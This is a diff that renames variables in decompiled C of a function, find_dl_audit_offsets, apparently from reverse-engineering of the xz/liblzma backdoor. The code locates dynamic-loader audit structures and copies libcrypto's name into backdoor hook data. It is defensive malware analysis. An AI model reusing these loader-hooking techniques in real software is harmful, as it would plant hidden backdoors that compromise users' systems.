@@ -26,20 +26,20 @@ BOOL find_dl_audit_offsets
   Elf64_Ehdr *libcrypto_ehdr;
   elf_handles_t *elf_handles;
   u64 size;
-  char **ppcVar6;
-  char *pcVar7;
+  char **libcrypto_name_entry;
+  char *libcrypto_name_bytes;
   BOOL success;
   lzma_allocator *allocator;
   Elf64_Sym *pEVar9;
   pfn_EVP_PKEY_free_t evp_pkey_free_stub;
   pfn_EC_KEY_get0_group_t ec_group_stub;
   pfn_EVP_CIPHER_CTX_free_t cipher_ctx_free_stub;
-  long lVar13;
+  long copy_idx;
   uchar *audit_symbol_vaddr;
   backdoor_hooks_data_t *hooks_cursor;
-  byte bVar15;
+  byte zero_seed;
   
-  bVar15 = 0;
+  zero_seed = 0;
   success = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x0,10,0,FALSE);
   if (success != FALSE) {
     allocator = get_lzma_allocator();
@@ -94,23 +94,23 @@ BOOL find_dl_audit_offsets
              (success = find_link_map_l_audit_any_plt(data,*libname_offset,hooks,imported_funcs),
              success != FALSE)) {
             hooks_cursor = hooks;
-            for (lVar13 = 0x10; lVar13 != 0; lVar13 = lVar13 + -1) {
+            for (copy_idx = 0x10; copy_idx != 0; copy_idx = copy_idx + -1) {
               (hooks_cursor->ldso_ctx)._unknown1459[0] = '\0';
               (hooks_cursor->ldso_ctx)._unknown1459[1] = '\0';
               (hooks_cursor->ldso_ctx)._unknown1459[2] = '\0';
               (hooks_cursor->ldso_ctx)._unknown1459[3] = '\0';
-              hooks_cursor = (backdoor_hooks_data_t *)((long)hooks_cursor + (ulong)bVar15 * -8 + 4);
+              hooks_cursor = (backdoor_hooks_data_t *)((long)hooks_cursor + (ulong)zero_seed * -8 + 4);
             }
-            ppcVar6 = (hooks->ldso_ctx).libcrypto_l_name;
-            libname_len = *(uint *)(ppcVar6 + 1);
+            libcrypto_name_entry = (hooks->ldso_ctx).libcrypto_l_name;
+            libname_len = *(uint *)(libcrypto_name_entry + 1);
             if (libname_len < 9) {
               if (libname_len != 0) {
-                pcVar7 = *ppcVar6;
-                lVar13 = 0;
+                libcrypto_name_bytes = *libcrypto_name_entry;
+                copy_idx = 0;
                 do {
-                  (hooks->ldso_ctx)._unknown1459[lVar13] = pcVar7[lVar13];
-                  lVar13 = lVar13 + 1;
-                } while ((ulong)libname_len << 3 != lVar13);
+                  (hooks->ldso_ctx)._unknown1459[copy_idx] = libcrypto_name_bytes[copy_idx];
+                  copy_idx = copy_idx + 1;
+                } while ((ulong)libname_len << 3 != copy_idx);
               }
               return TRUE;
             }
